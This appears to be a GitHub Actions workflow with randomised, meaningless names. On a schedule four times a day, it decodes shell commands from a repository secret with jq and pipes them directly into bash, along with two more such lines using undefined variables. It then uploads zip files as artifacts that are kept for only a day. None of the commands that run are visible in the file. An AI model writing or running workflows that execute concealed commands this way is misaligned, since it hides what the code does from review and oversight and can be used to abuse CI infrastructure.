name: xiangheihongjie
on:
  workflow_dispatch:

  schedule:
    - cron: '37 5,11,17,23 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: xiangheihongjie
        env:
          h700: ${{ secrets.h700 }}
        run: |
          printf '%s' "$h700" | jq -r .sw8 | /bin/bash
          printf '%s' "$sq86" | jq -r .wo12 | /bin/bash
          echo $vlxy82887 | jq -r .iqp37233 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: xKuIhqMI
          path: "*.zip"
          retention-days: 1
